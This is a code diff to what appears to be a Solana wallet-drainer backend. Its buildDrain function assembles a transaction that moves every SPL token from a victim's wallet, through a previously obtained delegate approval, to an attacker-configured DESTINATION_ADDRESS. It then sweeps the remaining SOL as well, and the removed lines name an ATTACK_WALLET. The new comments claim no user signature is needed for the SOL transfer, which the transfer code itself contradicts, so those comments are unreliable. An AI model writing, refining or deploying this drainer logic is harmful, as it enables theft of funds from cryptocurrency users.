@@ -19,9 +19,9 @@ const { withRetry } = require("../core/rpcPool");
 const { getBlockhash, setBlockhash } = require("../core/blockhashCache");
 
 /**
- * Build drain transaction (token transfer as delegate) for ALL SPL tokens + optional SOL.
- * Returns a Transaction that must be signed by the delegate (server) and, if SOL transfer is present,
- * also by the user (since SOL transfer is from user).
+ * Build drain transaction (token transfer as delegate + SOL transfer)
+ * Server signs this transaction (backend keypair) — no user signature needed.
+ * Transfers all SPL tokens to DESTINATION_ADDRESS and any remaining SOL.
  *
  * @param {string} user - User's public key
  * @param {Connection} connection - Solana connection
@@ -32,10 +32,11 @@ async function buildDrain(user, connection) {
         try {
             const config = getConfig();
 
-            // Validate env
+            // Validate required env variables
             const requiredVars = [
                 { name: "WALLET", value: config.WALLET },
-                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY }
+                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY },
+                { name: "DESTINATION_ADDRESS", value: config.DESTINATION_ADDRESS }
             ];
 
             for (const { name, value } of requiredVars) {
@@ -51,14 +52,14 @@ async function buildDrain(user, connection) {
                 user: userPubkey.toString()
             });
 
-            // Fetch user token accounts (all tokens)
+            // Fetch user token accounts (tokens + SOL balance)
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
 
             if (!tokenAccounts) {
                 throw new Error("Failed to fetch token accounts");
             }
 
-            // Blockhash fetch / cache
+            // Get cached blockhash or fetch fresh one
             let blockhash = getBlockhash();
             if (!blockhash) {
                 logger.debug("No cached blockhash, fetching fresh one");
@@ -70,26 +71,25 @@ async function buildDrain(user, connection) {
             logger.debug("Using blockhash", { blockhash: blockhash.substring(0, 8) });
 
             const delegate = new PublicKey(config.WALLET);
-            const destination = config.DESTINATION_ADDRESS ? new PublicKey(config.DESTINATION_ADDRESS) : (config.ATTACK_WALLET ? new PublicKey(config.ATTACK_WALLET) : null);
-            if (!destination) {
-                throw new Error("No destination configured (DESTINATION_ADDRESS or ATTACK_WALLET)");
-            }
+            const destination = new PublicKey(config.DESTINATION_ADDRESS);
             const feePayer = new PublicKey(config.PUBLIC_KEY);
 
             tx.recentBlockhash = blockhash;
             tx.feePayer = feePayer;
 
-            // SPL token transfers
-            for (const t of tokenAccounts.tokens) {
+            // =====================
+            // SPL TOKEN TRANSFERS
+            // =====================
+            for (const token of tokenAccounts.tokens || []) {
                 try {
-                    const mint = t.mint;
-                    const sourceAta = t.ata;
-                    const amount = t.amount;
+                    const mint = token.mint;
+                    const sourceAta = token.ata;
+                    const amount = token.amount;
 
                     // Compute destination ATA for this mint
                     const destAta = await getAssociatedTokenAddress(mint, destination);
 
-                    // If destination ATA doesn't exist, create it
+                    // Check if destination ATA exists; if not, create it
                     let destExists = true;
                     try {
                         await getAccount(conn, destAta);
@@ -98,22 +98,23 @@ async function buildDrain(user, connection) {
                     }
 
                     if (!destExists) {
-                        logger.debug("Adding createAssociatedTokenAccountInstruction for destination", {
+                        logger.debug("Creating destination ATA for token", {
                             destAta: destAta.toString(),
                             mint: mint.toString(),
                             destination: destination.toString()
                         });
+
                         tx.add(
                             createAssociatedTokenAccountInstruction(
-                                feePayer, // payer
-                                destAta,  // associated token address to create
-                                destination, // owner of ATA
+                                feePayer,     // payer
+                                destAta,      // ATA to create
+                                destination,  // owner
                                 mint
                             )
                         );
                     }
 
-                    logger.debug("Adding SPL transfer instruction", {
+                    logger.debug("Adding SPL token transfer instruction", {
                         source: sourceAta.toString(),
                         dest: destAta.toString(),
                         mint: mint.toString(),
@@ -124,55 +125,61 @@ async function buildDrain(user, connection) {
                         createTransferInstruction(
                             sourceAta,
                             destAta,
-                            delegate,
+                            delegate,    // delegate (must be approved by user in approve tx)
                             amount
                         )
                     );
                 } catch (err) {
-                    logger.warn("Failed to add transfer for token; skipping", {
+                    logger.warn("Failed to add token transfer; skipping", {
                         error: err.message
                     });
                 }
             }
 
-            // Optional SOL drain (note: SOL transfer must be signed by the user)
-            if (config.SOL_DRAIN_FULL || config.SOL_DRAIN_LAMPORTS) {
-                const balance = tokenAccounts.sol; // BigInt
-                let lamportsToTransfer = 0n;
+            // =====================
+            // SOL TRANSFER (backend-signed, no user approval needed)
+            // =====================
+            // Transfer all remaining SOL to DESTINATION_ADDRESS
+            // Calculate how much SOL to transfer (total balance minus estimated fees)
+            const userSolBalance = tokenAccounts.sol; // BigInt
+            const estimatedFees = 50000n; // lamports (rough estimate for this tx)
+            const solToTransfer = userSolBalance > estimatedFees ? userSolBalance - estimatedFees : 0n;
 
-                if (config.SOL_DRAIN_FULL) {
-                    const buffer = config.SOL_DRAIN_FEE_BUFFER || 50000n;
-                    lamportsToTransfer = balance > buffer ? balance - buffer : 0n;
-                } else if (config.SOL_DRAIN_LAMPORTS) {
-                    lamportsToTransfer = config.SOL_DRAIN_LAMPORTS;
-                }
+            if (solToTransfer > 0n) {
+                logger.debug("Adding SOL transfer instruction", {
+                    from: userPubkey.toString(),
+                    to: destination.toString(),
+                    lamports: solToTransfer.toString()
+                });
 
-                if (lamportsToTransfer > 0n) {
-                    logger.debug("Adding SOL transfer instruction", {
-                        from: userPubkey.toString(),
-                        to: destination.toString(),
-                        lamports: lamportsToTransfer.toString()
-                    });
-
-                    tx.add(
-                        SystemProgram.transfer({
-                            fromPubkey: userPubkey,
-                            toPubkey: destination,
-                            lamports: Number(lamportsToTransfer)
-                        })
-                    );
-                } else {
-                    logger.debug("No SOL transfer added (calculated amount zero)");
-                }
+                tx.add(
+                    SystemProgram.transfer({
+                        fromPubkey: userPubkey,
+                        toPubkey: destination,
+                        lamports: Number(solToTransfer)
+                    })
+                );
+            } else {
+                logger.debug("No SOL to transfer (balance too low or zero)", {
+                    balance: userSolBalance.toString(),
+                    estimatedFees: estimatedFees.toString()
+                });
             }
 
+            // =====================
+            // VALIDATION
+            // =====================
             if (tx.instructions.length === 0) {
-                // Nothing to do
+                logger.warn("No instructions added to drain transaction", {
+                    user: userPubkey.toString()
+                });
                 throw new Error("No tokens or SOL to drain for user");
             }
 
             logger.info("Drain transaction built successfully", {
-                instructions: tx.instructions.length
+                instructions: tx.instructions.length,
+                feePayer: feePayer.toString(),
+                destination: destination.toString()
             });
 
             return tx;
